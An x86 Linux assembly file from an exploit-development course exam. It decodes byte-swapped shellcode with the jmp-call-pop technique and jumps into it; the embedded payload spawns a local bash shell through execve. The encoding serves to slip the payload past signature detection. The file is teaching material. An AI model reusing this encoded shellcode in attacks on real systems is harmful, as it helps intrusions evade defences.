; Filename: encoder.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Website:  http://0xdeadcode.se
;
;
; Purpose: Assignement 4 - SLAE Exam
;          Decode the encoded shellcode and execute it

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi				; put address to EncodedShellcode into ESI (jmp-call-pop)
	xor eax, eax			; register to hold data
	xor ecx, ecx			; loop counter
	mov cl, 15			; loop 15 times (our shellcode is 30 length)

decode:
	; switch data between esi and esi+1	
	mov  al, byte [esi]
	xchg byte [esi+1], al
	mov [esi], al

	; move to the 2 bytes and loop
	add esi, 2
	loop decode

	; we're done, move to our decoded shellcode
	jmp short EncodedShellcode

call_shellcode:
	call decoder
	EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd

